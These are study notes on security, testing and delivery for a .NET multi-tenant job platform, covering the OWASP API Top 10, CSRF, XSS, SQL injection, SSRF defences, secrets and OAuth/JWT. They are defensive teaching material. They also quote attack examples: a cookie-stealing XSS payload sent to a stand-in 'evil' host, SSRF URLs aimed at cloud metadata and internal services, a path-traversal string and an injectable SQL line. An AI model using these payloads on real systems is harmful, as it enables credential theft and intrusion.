# Engineering practice — security, testing, Git, Linux, Docker, CI/CD, cloud, observability

[← Start here](../README.md) · [The plan](../PLAN.md) · [All notes](README.md)

Month 5 part C (your project in production terms), the security/testing/delivery table, and added practical guides. Weeks 15–19 use this chapter.

Use it like this: read one question, close it, explain it aloud from memory, then check. Reading is not the same as knowing. ⚠️ boxes mark corrections to the original text. Sections marked ➕ were added in the final version to fill gaps.

**In this chapter:**

- PART C - Your project, in production terms
- Security, testing, delivery and cloud (12 Oct guide)
- ➕ OWASP API Security Top 10 (2023) applied to the job platform
- ➕ Web security essentials
- ➕ JWT, OAuth 2.0 and OpenID Connect in practice
- ➕ A lightweight threat model for the job platform
- ➕ Testing strategy in .NET
- ➕ Git essentials
- ➕ Linux essentials for a backend engineer
- ➕ Docker for .NET 10
- ➕ CI with GitHub Actions
- ➕ CD: deployment and release safety
- ➕ Kubernetes basics (OPTIONAL extension)
- ➕ AWS basics mapped to the project
- ➕ Observability with OpenTelemetry in .NET
- ➕ SLIs, SLOs and error budgets for the job platform
- ➕ Incident diagnosis from evidence
- Summary
- Impact
- Timeline (UTC)
- Root cause
- Detection
- What went well / what went badly / where we got lucky
- Action items
- ➕ Load testing with k6
- ➕ Runbooks
- What it means
- Check first (5 minutes)
- Mitigate
- Find the cause
- Escalate
- After

---

<a id="m5-part-c"></a>

## PART C - Your project, in production terms

*Source: Q-and-A/M5_System_Design_and_Behavioural.docx. Original wording kept below; ⚠️ boxes are corrections added in the final version.*

<a id="m5-q11"></a>

#### Q11. How do you stop one tenant starving the others?
Say this. Per-tenant fairness rather than a single global queue. Either a queue per tenant with round-robin consumption, or weighted fair queueing, plus a per-tenant concurrency cap and a rate limit at the API. Without that, a tenant submitting a hundred thousand jobs owns the whole worker pool.
Why. A single FIFO queue is fair in arrival order, which is not the same as fair between tenants. A bulk submitter legitimately gets everything.
Watch out. This is the multi-tenant version of the bulkhead pattern, and it is a genuinely good thing to have in your project because most demo projects miss it.
<a id="m5-q12"></a>

#### Q12. How do you prove tenant isolation rather than assert it?
Say this. A test that tries to read tenant B's job as tenant A and asserts a 404 or 403. Then enforce it in one place - a query filter or repository layer that always applies the tenant predicate - rather than remembering it at every call site.
Why. Isolation implemented per-endpoint will be forgotten on the twelfth endpoint. Implemented once as a filter, it cannot be forgotten.
Watch out. Prefer 404 over 403 for another tenant's resource - 403 confirms the ID exists, which leaks information.
<a id="m5-q13"></a>

#### Q13. Liveness or readiness - what is the difference and why does it matter?
Say this. Liveness answers "is this process healthy, or should it be restarted?" Readiness answers "can it serve traffic right now?" A pod warming a cache or waiting for a database is alive but not ready. Getting them backwards is dangerous: if liveness checks a database, a database blip restarts every instance simultaneously.
Why. Liveness controls the restart decision; readiness controls the load balancer. Coupling liveness to a shared dependency turns a dependency outage into a total outage.
Watch out. Liveness should check almost nothing - "is the event loop responsive". Readiness checks dependencies. That distinction is the answer.

> ⚠️ **Correction (final version, 19 Oct 2026):** [Nuance] 'Is the event loop responsive' is a Node.js idiom. In ASP.NET Core: liveness = an endpoint (e.g. `/healthz/live`) that checks no dependencies; readiness = tagged health checks for the database/broker; plus startup probes for slow starts.

<a id="m5-q14"></a>

#### Q14. What do p50, p95 and p99 tell you, and why not the average?
Say this. p99 means 99% of requests were faster than this. The average hides the tail: a system with a 50 ms average can have a 3-second p99, and that 1% is who complains. At scale 1% is a lot of people, and a page making twenty calls will hit the p99 on most page loads.
Why. Averages are dominated by the bulk; latency problems live in the tail. Percentiles are the only honest measure.
Watch out. Never average percentiles across servers - it is mathematically meaningless. And measure p99 of what the user experiences, not of one internal call.

> ⚠️ **Correction (final version, 19 Oct 2026):** [Interview-critical] The arithmetic is wrong. With 20 independent calls, the chance a page load hits at least one p99 tail is 1 − 0.99^20 ≈ **18%**, not 'most page loads'. 'Most' (>50%) needs about 69 calls; 100 calls give ~63% ('The Tail at Scale'). To combine percentiles across servers, aggregate histograms (Prometheus buckets + `histogram_quantile`, HDR, t-digest), never average percentiles.

<a id="m5-q15"></a>

#### Q15. Why do multi-stage Docker builds matter?
Say this. You build with the SDK in one stage and copy only the published output into a runtime-only final image. The compiler, sources, NuGet cache and intermediate files never reach the shipped image - typically a several-hundred-megabyte image becomes under a hundred.
Why. Smaller images pull faster, start faster, and have a smaller attack surface because there is no compiler or shell tooling to exploit.
Watch out. Have your own before-and-after numbers from week 19, and mention running as a non-root user - it is a one-line change interviewers notice.

> ⚠️ **Correction (final version, 19 Oct 2026):** [Outdated] .NET 8+ images ship a non-root `app` user (`USER $APP_UID`) and listen on port 8080 by default (`ASPNETCORE_HTTP_PORTS`). `dotnet publish /t:PublishContainer` builds an image without a Dockerfile. Image size depends on the base image (see M2 Q13).

<a id="m5-q16"></a>

#### Q16. What does your CI pipeline protect against, stage by stage?
Say this. Restore and build catches "it does not compile on a clean machine". Unit tests catch logic regressions. Integration tests against real Postgres and Redis catch wiring and SQL problems a mock would hide. Lint and analysers catch a class of bug and enforce consistency. Branch protection stops any of it being bypassed. Then the CD half builds and pushes an image only from a green build.
Why. Each stage is a category of failure caught at the cheapest point. The value is in what it prevents reaching production, not in the pipeline itself.
Watch out. "I built it rather than copying a template" matters here - be able to explain why each stage exists, because a copied pipeline is obvious under one follow-up.
<a id="m5-q17"></a>

#### Q17. How do you actually find a bottleneck under load?
Say this. Ramp the load in steps rather than jumping to the maximum. Watch where p95 turns sharply upward - that is saturation. At that point look at what is queuing: connection pool waits, queue depth, CPU, disk. Change one thing, re-measure, confirm the curve moved. Then stop, because the next bottleneck is always somewhere else.
Why. A step ramp shows you the curve; a single big number tells you only pass or fail. The bend in the curve is the information.
Watch out. "I scaled workers from one to four and throughput went up 3.2x, so it scales horizontally but not linearly - the database became the limit" is a genuinely excellent sentence. Have your version of it.


## Security, testing, delivery and cloud (12 Oct guide)

<a id="f05-s8"></a>

### 8. Security, testing, delivery and cloud

*Source: FAANG-Master-Plan/05_START_HERE_BASIC_TO_ADVANCED.md (12 Oct 2026). Original wording kept below; ⚠️ boxes are corrections added in the final version.*


| Area | Minimum coverage | Required exercise |
|---|---|---|
| Identity | Authentication vs authorization, cookies/tokens, JWT validation, OAuth/OIDC roles, expiry/rotation | Expired/wrong-audience/wrong-signature token fails; authenticated user still needs object permission |
| API security | Object/function access, injection, validation, over-posting, request limits, CSRF vs CORS, SSRF, secrets and sensitive logs | Threat-model the job API and implement negative access/input tests |
| Testing | Unit/integration/end-to-end boundaries, realistic dependencies, deterministic clock/randomness, failure tests | Integration tests with a real test database; fake time for retry/rate-limit logic |
| Evolution | API and event compatibility, serialization, versioning, deployment order | New worker handles an old message; old deployment survives an additive schema change |
| Docker | Images/containers, Dockerfile/layers, build context, ports, networks, volumes, config, logs, non-root user, health checks | Start API/worker/database/broker reproducibly with Compose |
| CI | Restore/build/test, formatting/static checks, artifacts, secrets handling | A failing meaningful test blocks the pipeline |
| CD | Environment configuration, deployment, smoke test, migrations, rollback, health/readiness | Deploy a good version, inject a bad version in a test environment, recover |
| Cloud basics | Compute, managed database, queues, object storage, IAM, network exposure, monitoring and cost | Deploy a bounded environment with a budget alert and teardown instructions |
| Recovery | Backups, restore, RPO/RTO, reconciliation, runbook | Restore into a clean test database and compare expected durable records |

Use AWS initially because it connects to your experience. Understand equivalent service categories rather than studying three cloud platforms. Kubernetes deployments/services/probes/autoscaling are optional extension material after Docker, CI/CD and one working deployment.



---

<a id="add-sec-owasp"></a>

## ➕ OWASP API Security Top 10 (2023) applied to the job platform

Source: OWASP API Security Top 10, 2023 edition: https://owasp.org/API-Security/editions/2023/en/0x11-t10/

The list names the ten most common API risks. For each item, learn four things: what it means, where it would appear in your project, the ASP.NET Core defence, and one negative test. A negative test checks that a bad request **fails**.

**The API shape used in this chapter.** Use these names in your project, or change them to match.

| Endpoint | Who can call it |
|---|---|
| `POST /jobs` | client with scope `jobs:write` |
| `GET /jobs/{id}`, `GET /jobs?status=&page=` | client with scope `jobs:read` |
| `POST /jobs/{id}/cancel` | client with scope `jobs:write` |
| `POST /admin/jobs/{id}/requeue`, `GET /admin/tenants` | operator with scope `jobs:admin` |

Every token carries a `tenant_id` claim. A job can have an optional `callbackUrl`. The worker calls it when the job finishes.

### API1:2023 Broken Object Level Authorization (BOLA)

- **Means:** the API checks *who you are*, but not *whether this object is yours*.
- **In the platform:** `GET /jobs/{id}` loads any job by ID. Tenant A sees tenant B's job ID in a log or guesses it, and reads the job.
- **Defence:** filter by tenant in **one place**. Use an EF Core global query filter. Return 404, not 403. A 403 tells the attacker that the ID exists.

```csharp
public sealed class JobsDb : DbContext
{
    private readonly ITenantContext _tenant;   // reads tenant_id from the current user
    public JobsDb(DbContextOptions<JobsDb> options, ITenantContext tenant) : base(options) => _tenant = tenant;

    public Guid TenantId => _tenant.TenantId;
    public DbSet<Job> Jobs => Set<Job>();

    protected override void OnModelCreating(ModelBuilder b) =>
        b.Entity<Job>().HasQueryFilter(j => j.TenantId == TenantId);
}

app.MapGet("/jobs/{id:guid}", async (Guid id, JobsDb db, CancellationToken ct) =>
        await db.Jobs.AsNoTracking().FirstOrDefaultAsync(j => j.Id == id, ct) is { } job
            ? Results.Ok(JobResponse.From(job))
            : Results.NotFound())
   .RequireAuthorization("jobs:read");
```

- **Watch out:** Dapper and raw SQL do **not** use the EF filter. Add `AND tenant_id = @tenantId` by hand, and test it. Use `IgnoreQueryFilters()` only in admin code with a clear name.
- **Negative test:** tenant A cannot GET tenant B's job by ID → 404. Tenant A cannot cancel it → 404. `GET /jobs` as tenant A returns no tenant B jobs.

### API2:2023 Broken Authentication

- **Means:** an attacker can act as someone else because login or token checks are weak.
- **In the platform:** token validation was switched off "for local testing" and shipped. API keys never expire. Tokens from any issuer are accepted.
- **Defence:** `AddJwtBearer` with full validation (see `add-sec-tokens`). A fallback policy so every endpoint needs a user by default. Store API keys as hashes. Rate-limit token and key endpoints.

```csharp
builder.Services.AddAuthorizationBuilder()
    .SetFallbackPolicy(new AuthorizationPolicyBuilder().RequireAuthenticatedUser().Build())
    .AddPolicy("jobs:read",  p => p.RequireAssertion(c => Scopes.Has(c.User, "jobs:read")))
    .AddPolicy("jobs:write", p => p.RequireAssertion(c => Scopes.Has(c.User, "jobs:write")))
    .AddPolicy("admin",      p => p.RequireAssertion(c => Scopes.Has(c.User, "jobs:admin")));

public static class Scopes
{
    // "scope" is usually one space-separated string: "jobs:read jobs:write"
    public static bool Has(ClaimsPrincipal user, string scope) =>
        user.FindAll("scope").SelectMany(c => c.Value.Split(' ')).Contains(scope);
}
```

- **Negative test:** an expired token → 401. No token → 401 on **every** endpoint except `/healthz/*`. (Loop over the routes from `EndpointDataSource` in one test.)

### API3:2023 Broken Object Property Level Authorization

- **Means:** a user can read or write **fields** they should not. This joins two old items: excessive data exposure and mass assignment.
- **In the platform:** `POST /jobs` accepts `"tenantId"`, `"status": "Completed"` or `"priority": "high"` from a free-plan tenant. `GET /jobs/{id}` returns the entity with `LeaseOwner`, `WorkerHost` and the raw exception text.
- **Defence:** separate request and response DTOs. Never bind or return EF entities. The server sets `TenantId` and `Status`. Reject unknown JSON fields. Check permission for sensitive fields such as `priority`.
- **Negative test:** POST with `"tenantId": "<B>"` and `"status": "Completed"` → 400 (unknown fields), and no row is created. GET response JSON has no `leaseOwner` property.

### API4:2023 Unrestricted Resource Consumption

- **Means:** no limits on size, count, rate, time or cost.
- **In the platform:** 50 MB payloads. `GET /jobs?pageSize=1000000`. One tenant sends 100,000 jobs a minute. A job with no timeout runs forever. A failing job retries forever.
- **Defence:** Kestrel body limit, a page-size cap, a per-tenant rate limiter that returns 429, a per-tenant quota of in-flight jobs, a job execution timeout, and a maximum number of attempts.

```csharp
builder.Services.AddRateLimiter(o =>
{
    o.RejectionStatusCode = StatusCodes.Status429TooManyRequests;   // default is 503
    o.AddPolicy("per-tenant", ctx => RateLimitPartition.GetTokenBucketLimiter(
        partitionKey: ctx.User.FindFirst("tenant_id")?.Value ?? "anonymous",
        factory: _ => new TokenBucketRateLimiterOptions
        {
            TokenLimit = 100,                       // burst (example value)
            TokensPerPeriod = 50,                   // steady rate (example value)
            ReplenishmentPeriod = TimeSpan.FromSeconds(1),
            QueueLimit = 0,
            AutoReplenishment = true
        }));
});

app.UseAuthentication();
app.UseAuthorization();
app.UseRateLimiter();          // after auth, so ctx.User is known
app.MapPost("/jobs", CreateJob).RequireAuthorization("jobs:write").RequireRateLimiting("per-tenant");
```

- **Watch out:** this limiter lives in memory, so it counts per instance. Three API instances allow three times the limit. For one global limit you need a shared store such as Redis.
- **Negative test:** a 1 MB body to `POST /jobs` (limit 256 KB) → 413. `pageSize=10000` → 400. The request after the burst is used up → 429.

### API5:2023 Broken Function Level Authorization (BFLA)

- **Means:** a normal user can call admin **functions**.
- **In the platform:** `/admin/jobs/{id}/requeue` only checks "is the user logged in".
- **Defence:** put admin routes in one group with one policy. Deny by default.

```csharp
var admin = app.MapGroup("/admin").RequireAuthorization("admin");
admin.MapPost("/jobs/{id:guid}/requeue", RequeueJob);
admin.MapGet("/tenants", ListTenants);
```

- **Negative test:** a token with only `jobs:write` calls `POST /admin/jobs/{id}/requeue` → 403.

### API6:2023 Unrestricted Access to Sensitive Business Flows

- **Means:** a normal, working flow is abused at scale and hurts the business. The code has no bug. The design has no limit.
- **In the platform:** a free-plan tenant floods high-priority jobs. A script creates many trial tenants to get free compute.
- **Defence:** quotas per plan, a maximum of in-flight jobs per tenant, priority only for plans that allow it, verified sign-up, and per-tenant usage dashboards.
- **Negative test:** a free tenant at its in-flight quota (for example 50) creates job 51 → 429 with a problem type such as `quota-exceeded`. A free tenant asks for `priority: high` → 403.

### API7:2023 Server Side Request Forgery (SSRF)

- **Means:** the server fetches a URL that the user controls.
- **In the platform:** the worker POSTs the result to `callbackUrl`. An attacker sets it to `http://169.254.169.254/latest/meta-data/` (cloud metadata), `http://rabbitmq:15672/api/queues` or `http://localhost:8080/admin/...`.
- **Defence:** validate when the job is created (https only, no private or link-local addresses), check **again** when connecting (DNS can change), no redirects, short timeouts, and limit outbound traffic at the network level. Code is in `add-sec-web`.
- **Negative test:** `callbackUrl = http://169.254.169.254/latest/meta-data/` → 400. `https://localhost/x` → 400. A unit test shows the connect guard refuses a host that resolves to `10.0.0.5`.

### API8:2023 Security Misconfiguration

- **Means:** unsafe defaults or settings.
- **In the platform:** developer exception page in production, stack traces in responses, CORS `AllowAnyOrigin`, RabbitMQ `guest/guest`, PostgreSQL port open to the internet, Swagger UI public.
- **Defence:** `AddProblemDetails()` + `UseExceptionHandler()`, config per environment, security groups that close database and broker ports, no default passwords.

```csharp
builder.Services.AddProblemDetails();
builder.WebHost.ConfigureKestrel(o => o.AddServerHeader = false);
var app = builder.Build();
if (!app.Environment.IsDevelopment()) app.UseExceptionHandler();
```

- **Negative test:** in the `Production` environment, an endpoint that throws returns `application/problem+json` and the body does not contain `"   at "` (stack trace text). The response has no `Server` header.

### API9:2023 Improper Inventory Management

- **Means:** you do not know which APIs, versions and hosts are live.
- **In the platform:** an old `/v0/jobs` without the tenant filter is still deployed. A public staging API holds a copy of production data. A debug route `/internal/replay` is still mapped.
- **Defence:** generate the OpenAPI document from code (`builder.Services.AddOpenApi()`, `app.MapOpenApi()` only in Development or behind auth). Give old versions an end date. Tag every cloud resource with `project=jobs` and `env=...`.
- **Negative test:** in `Production`, `GET /openapi/v1.json` → 404. A route snapshot test lists every mapped route and compares it to an approved list. A new route fails the test until someone reviews it.

### API10:2023 Unsafe Consumption of APIs

- **Means:** you trust data from a third-party API too much.
- **In the platform:** the worker calls a partner API (or AWS SES) and trusts the reply. A huge or broken reply crashes the worker, or a redirect sends it to an internal host.
- **Defence:** treat replies as untrusted input. Validate the shape, limit size (`HttpClient.MaxResponseContentBufferSize`), set timeouts, require TLS, turn off auto-redirects, and add a circuit breaker.
- **Negative test:** a fake partner (a stub `HttpMessageHandler` or WireMock.Net) returns a 10 MB body or invalid JSON → the job fails with a clear error, the worker keeps running, and the message goes to retry or DLQ.

**Interview line:** "I took the OWASP API Top 10 and wrote one negative test per item. The BOLA test is the one I would show first: tenant A gets 404 for tenant B's job, and the filter lives in one place."

---

<a id="add-sec-web"></a>

## ➕ Web security essentials

### Authentication vs authorization

- **Authentication** answers "who are you?" It checks a password, a token or a key. Failure → **401 Unauthorized**.
- **Authorization** answers "may you do this, to this object?" Failure → **403 Forbidden** (or 404 to hide that the object exists).
- A valid token is only the start. An authenticated user still needs permission for the **function** (scope or role) and for the **object** (same tenant).

### Sessions and cookies vs bearer tokens

| | Session cookie | Bearer token (JWT) |
|---|---|---|
| Where it lives | Cookie; the browser sends it **automatically** | `Authorization: Bearer ...` header; the client adds it |
| State | Server keeps the session (or an encrypted cookie) | Self-contained; server checks signature and claims |
| Revoke | Delete the session; instant | Hard before expiry; keep access tokens short |
| CSRF risk | Yes, because the browser sends it automatically | No, if the token is not stored in a cookie |
| Best for | Browser apps on the same site | APIs, service-to-service, mobile |

The job platform is an API for other programs, so it uses bearer tokens. If you add a browser dashboard later, a cookie session (or the backend-for-frontend pattern) is often safer than putting tokens in JavaScript.

### Cookie flags

```
Set-Cookie: session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
```

- `HttpOnly`: JavaScript cannot read the cookie. This limits damage from XSS.
- `Secure`: the browser sends the cookie only over HTTPS.
- `SameSite=Lax`: the browser does not send the cookie on most cross-site requests (it still sends it on top-level GET navigation). `Strict` blocks all cross-site sends. `None` sends it everywhere and needs `Secure`.

```csharp
builder.Services.AddAuthentication().AddCookie(o =>
{
    o.Cookie.HttpOnly = true;
    o.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    o.Cookie.SameSite = SameSiteMode.Lax;
    o.ExpireTimeSpan = TimeSpan.FromHours(8);
    o.SlidingExpiration = true;
});
```

### CSRF, and why CORS does not stop it

**CSRF (cross-site request forgery):** a user is logged in to `app.example.com` with a cookie. They visit `evil.example`. That page submits a hidden form to `app.example.com/jobs/123/cancel`. The browser attaches the cookie automatically. The server sees a valid session and cancels the job.

**Defences:** antiforgery tokens (`builder.Services.AddAntiforgery()` + `app.UseAntiforgery()`; .NET 8+ minimal APIs validate them for form posts), `SameSite=Lax` or `Strict` cookies, and checking the `Origin` header on state-changing requests.

**Why CORS is not a CSRF defence:**

1. CORS controls whether browser JavaScript may **read the response**. It does not stop the request being **sent**.
2. A simple form POST does not trigger a CORS preflight. The server receives it and acts on it.
3. So the damage (the cancel) has already happened. CORS only hides the reply from the attacker.

**Why CORS is not authorization:** only browsers enforce CORS. `curl`, Postman and server code ignore it. Every endpoint still needs real authentication and authorization.

```csharp
builder.Services.AddCors(o => o.AddPolicy("dashboard", p => p
    .WithOrigins("https://dashboard.example.com")   // exact origins, never "*" with credentials
    .WithMethods("GET", "POST")
    .WithHeaders("Content-Type", "Authorization")));
app.UseCors("dashboard");
```

ASP.NET Core refuses `AllowAnyOrigin()` together with `AllowCredentials()`. Do not work around it.

### XSS and output encoding

- **XSS (cross-site scripting):** attacker text is shown in a page as HTML, so the browser runs it as script. Example: a job name `<script>fetch('https://evil/'+document.cookie)</script>` shown in an admin dashboard.
- **Defence:** encode output for its context. Razor encodes `@value` by default. `Html.Raw` and `innerHTML` turn that off, so avoid them. JSON APIs must return `Content-Type: application/json` (ASP.NET Core does this). Add a `Content-Security-Policy` header to any HTML you serve.
- Validate input too, but output encoding is the real fix. The same text may be safe in JSON and dangerous in HTML.

### SQL injection and parameterised queries

```csharp
// BAD: user input becomes SQL text
var rows = await db.Jobs.FromSqlRaw($"SELECT * FROM jobs WHERE type = '{type}'").ToListAsync();

// GOOD: EF Core LINQ is parameterised
var jobs = await db.Jobs.Where(j => j.Type == type).ToListAsync(ct);

// GOOD: FromSql with an interpolated string becomes a parameter, not text
var jobs2 = await db.Jobs.FromSql($"SELECT * FROM jobs WHERE type = {type}").ToListAsync(ct);

// GOOD: Dapper with parameters
var jobs3 = await conn.QueryAsync<JobRow>(
    "SELECT id, status FROM jobs WHERE tenant_id = @tenantId AND type = @type",
    new { tenantId, type });
```

Column names and sort direction **cannot** be parameters. Use an allowlist:

```csharp
var orderBy = sort switch { "created" => "created_at", "status" => "status", _ => "created_at" };
```

### SSRF: validating outbound URLs

The worker calls `callbackUrl`. Check it twice: when the job is created, and at connect time. The second check stops **DNS rebinding** (the name resolves to a public IP during validation and to `10.0.0.5` later).

```csharp
using System.Net;
using System.Net.Sockets;

public static class OutboundRules
{
    private static readonly IPNetwork[] Blocked =
    [
        IPNetwork.Parse("0.0.0.0/8"),      IPNetwork.Parse("10.0.0.0/8"),
        IPNetwork.Parse("100.64.0.0/10"),  IPNetwork.Parse("127.0.0.0/8"),
        IPNetwork.Parse("169.254.0.0/16"), // cloud metadata: 169.254.169.254, ECS 169.254.170.2
        IPNetwork.Parse("172.16.0.0/12"),  IPNetwork.Parse("192.168.0.0/16"),
        IPNetwork.Parse("::1/128"),        IPNetwork.Parse("fc00::/7"), IPNetwork.Parse("fe80::/10"),
    ];

    public static bool IsBlocked(IPAddress ip)
    {
        if (ip.IsIPv4MappedToIPv6) ip = ip.MapToIPv4();
        return Blocked.Any(n => n.Contains(ip));
    }

    // Check 1: at job creation
    public static bool IsAllowedCallback(string url) =>
        Uri.TryCreate(url, UriKind.Absolute, out var u)
        && u.Scheme == Uri.UriSchemeHttps
        && u.IsDefaultPort
        && !u.IsLoopback
        && !(IPAddress.TryParse(u.Host, out var ip) && IsBlocked(ip));
}

// Check 2: at connect time, inside the HTTP handler
builder.Services.AddHttpClient("webhooks")
    .ConfigurePrimaryHttpMessageHandler(() => new SocketsHttpHandler
    {
        AllowAutoRedirect = false,                      // a redirect could point inside
        ConnectTimeout = TimeSpan.FromSeconds(5),
        PooledConnectionLifetime = TimeSpan.FromMinutes(2),
        ConnectCallback = async (ctx, ct) =>
        {
            var addresses = await Dns.GetHostAddressesAsync(ctx.DnsEndPoint.Host, ct);
            if (addresses.Length == 0 || addresses.Any(OutboundRules.IsBlocked))
                throw new HttpRequestException($"Blocked destination {ctx.DnsEndPoint.Host}");

            var socket = new Socket(SocketType.Stream, ProtocolType.Tcp) { NoDelay = true };
            try
            {
                await socket.ConnectAsync(new IPEndPoint(addresses[0], ctx.DnsEndPoint.Port), ct);
                return new NetworkStream(socket, ownsSocket: true);
            }
            catch { socket.Dispose(); throw; }
        }
    });
```

Also: on EC2, require IMDSv2 (it needs a PUT with a token, which most SSRF bugs cannot send). Keep the worker in a private subnet with outbound rules as tight as you can.

### Outbound HTTP: client lifetime and timeouts

Two classic bugs:

1. `new HttpClient()` per request. Each one opens new sockets. Under load you run out of ports (**socket exhaustion**).
2. One static `HttpClient` forever with default settings. It keeps old connections, so it never sees DNS changes (for example after a failover).

**Fix:** use `IHttpClientFactory` (typed or named clients). It pools and recycles handlers. Or use one long-lived client with `SocketsHttpHandler { PooledConnectionLifetime = TimeSpan.FromMinutes(2) }`.

```csharp
// dotnet add package Microsoft.Extensions.Http.Resilience
builder.Services.AddHttpClient<PartnerClient>(c =>
{
    c.BaseAddress = new Uri("https://partner.example.com/");
    c.MaxResponseContentBufferSize = 1_000_000;        // 1 MB cap on buffered replies
})
.AddStandardResilienceHandler(o =>
{
    o.AttemptTimeout.Timeout = TimeSpan.FromSeconds(5);
    o.TotalRequestTimeout.Timeout = TimeSpan.FromSeconds(20);
    o.Retry.MaxRetryAttempts = 3;
    o.Retry.DisableForUnsafeHttpMethods();             // no automatic retry of POST/PUT/DELETE
});
```

- The standard handler adds a total timeout, retry with jittered backoff, a circuit breaker and a per-attempt timeout. Its defaults are about 30 s total and 10 s per attempt (verify in the package docs). Set your own values.
- `HttpClient.Timeout` defaults to 100 seconds. That is far too long for a worker.
- Retry a POST only if the receiver is idempotent. Send an `Idempotency-Key` header with the job ID so the receiver can drop duplicates.
- Always pass the `CancellationToken`.

### Mass assignment (over-posting): use DTOs

```csharp
// Request DTO: only what the client may set
public sealed record CreateJobRequest(
    [property: Required, StringLength(64)] string Type,
    [property: Required] JsonElement Payload,
    [property: Url] string? CallbackUrl,
    string Priority = "normal");

// Response DTO: only what the client may see
public sealed record JobResponse(Guid Id, string Type, string Status, DateTimeOffset CreatedAt)
{
    public static JobResponse From(Job j) => new(j.Id, j.Type, j.Status.ToString(), j.CreatedAt);
}

// Reject unknown fields such as "tenantId" or "status" (.NET 8+)
builder.Services.ConfigureHttpJsonOptions(o =>
    o.SerializerOptions.UnmappedMemberHandling = JsonUnmappedMemberHandling.Disallow);
```

The handler maps the DTO to the entity by hand. `TenantId` comes from the token. `Status` is always `Queued`. (.NET 10 minimal APIs can run DataAnnotations validation after `builder.Services.AddValidation()` (verify); otherwise validate in the handler.)

### Request size limits

```csharp
// Global: the Kestrel default is 30,000,000 bytes (about 28.6 MB). Make it smaller.
builder.WebHost.ConfigureKestrel(o => o.Limits.MaxRequestBodySize = 1_048_576);   // 1 MB

// Per endpoint
app.MapPost("/jobs", CreateJob)
   .WithMetadata(new RequestSizeLimitAttribute(262_144));                          // 256 KB
```

Also limit what is **inside** the body: array and string lengths, the JSON depth (`JsonSerializerOptions.MaxDepth`, default 64) and the page size. Too-large bodies get **413**.

### File upload safety

If a job takes an input file (for example a CSV to import):

1. Do not stream big files through the API. Give the client an S3 **presigned URL** and let it upload straight to S3. A presigned POST policy can set `content-length-range`.
2. Set a size limit before reading. Stream to storage; do not load the file into memory.
3. Do not trust the file name or `Content-Type`. Make your own name (`$"{Guid.NewGuid()}.csv"`). Never build a path from the user's name (`../../etc/passwd`).
4. Check the content: magic bytes for binary types, and parse text with limits.
5. Store files outside any web root, in a private bucket. Serve downloads with `Content-Disposition: attachment`.
6. Scan for malware if files are shared with other people.

### Secrets management

```bash
# Local development: user-secrets live outside the repo
dotnet user-secrets init --project src/Jobs.Api
dotnet user-secrets set "ConnectionStrings:Jobs" "Host=localhost;Database=jobs;Username=jobs;Password=dev-only" --project src/Jobs.Api
dotnet user-secrets list --project src/Jobs.Api
```

- **AWS:** Secrets Manager (rotation built in, charged per secret) or SSM Parameter Store `SecureString` (cheaper, no built-in rotation).
- **ECS:** put the secret ARN in the task definition `secrets` field. ECS injects it as an environment variable. The task **execution role** needs `secretsmanager:GetSecretValue` on that one ARN only.
- **RDS:** `--manage-master-user-password` keeps the master password in Secrets Manager and rotates it.
- **Never** commit secrets. Turn on GitHub secret scanning and push protection. If a secret was pushed, **rotate it**. Removing it from history is not enough.

### Sensitive data in logs

- Never log passwords, tokens, the `Authorization` header, API keys, connection strings, or full job payloads that may hold personal data.
- `AddHttpLogging` logs only the headers you allow. Keep that list short.
- Never use `EnableSensitiveDataLogging()` (EF Core) or `Include Error Detail=true` (Npgsql) in production. They put parameter values in logs.
- Log IDs (`JobId`, `TenantId`, `TraceId`), not content.

### Password hashing, API keys and TLS

```csharp
// dotnet add package Microsoft.Extensions.Identity.Core
var hasher = new PasswordHasher<User>();
string hash = hasher.HashPassword(user, password);          // PBKDF2, salted, many iterations
var result = hasher.VerifyHashedPassword(user, hash, attempt);
if (result == PasswordVerificationResult.SuccessRehashNeeded) { /* save a new hash */ }
```

- Never use plain SHA-256 or MD5 for **passwords**. They are too fast to guess.
- **API keys** are long random values (32 bytes from `RandomNumberGenerator`), so a SHA-256 hash is enough. Store only the hash, show the key once, and compare with `CryptographicOperations.FixedTimeEquals`.
- **TLS everywhere:** the load balancer terminates HTTPS with an ACM certificate. Inside AWS, use TLS too: `SSL Mode=VerifyFull` with the RDS CA bundle for PostgreSQL (RDS for PostgreSQL 15+ forces SSL by default; verify), AMQPS (port 5671) for Amazon MQ, and TLS for ElastiCache. Add HSTS for any browser-facing host.

---

<a id="add-sec-tokens"></a>

## ➕ JWT, OAuth 2.0 and OpenID Connect in practice

**Words first.** OAuth 2.0 is about **access**: a client gets an access token to call an API. OpenID Connect (OIDC) adds **login** on top: an ID token that says who the user is. A JWT is just a token **format**: `header.payload.signature`, each part base64url-encoded. The payload is readable by anyone, so never put secrets in it.

### Two flows to know

**Authorization code + PKCE** (a user logs in through a browser or mobile app):

1. The app makes a random `code_verifier` and sends its hash (`code_challenge`) to the identity provider (IdP).
2. The user logs in at the IdP. The IdP redirects back with a short-lived `code`.
3. The app sends `code` + `code_verifier` to the token endpoint and gets tokens.
4. PKCE proves that the app which started the login is the app which finishes it. A stolen `code` is useless without the verifier.

**Client credentials** (machine to machine, no user):

1. The client service sends its `client_id` + secret (or a signed assertion) to the token endpoint.
2. It gets an access token with scopes such as `jobs:write`.
3. No refresh token. It asks for a new access token when the old one expires.

**For the job platform:** clients that submit jobs use **client credentials**. Each client belongs to one tenant, so the IdP adds a `tenant_id` claim. A future human dashboard would use **authorization code + PKCE**. Do not build your own IdP. Use Keycloak in Docker locally, or Amazon Cognito, Auth0 or Entra ID. For quick local tokens, `dotnet user-jwts create --scope "jobs:write" --claim tenant_id=tenant-a` works with the JwtBearer handler in Development.

### Access tokens vs refresh tokens

| | Access token | Refresh token |
|---|---|---|
| Sent to | the API, on every call | only the IdP token endpoint |
| Lifetime | short (5–15 minutes is common) | longer (hours to days) |
| Format | often a JWT, checked offline | opaque random string, stored by the IdP |
| If stolen | works until expiry | can mint new access tokens, so must be protected and rotated |

### Refresh token rotation and reuse detection

1. Every refresh returns a **new** refresh token. The old one is marked as used.
2. All refresh tokens from one login share a `family_id`.
3. If a **used** refresh token comes back, someone copied it. Revoke the whole family. Both the attacker and the real user must log in again.
4. Store only a **hash** of each refresh token: `(token_hash, family_id, user_id, expires_at, used_at, revoked_at)`.

### Revocation options for access tokens

A JWT is valid until `exp`, even after logout. Options:

- **Short lifetime.** The simplest option. Revocation waits at most a few minutes.
- **Denylist by `jti`.** Put the token ID in Redis with a TTL equal to the time left until `exp`. Check it in `JwtBearerEvents.OnTokenValidated`. Costs one lookup per request.
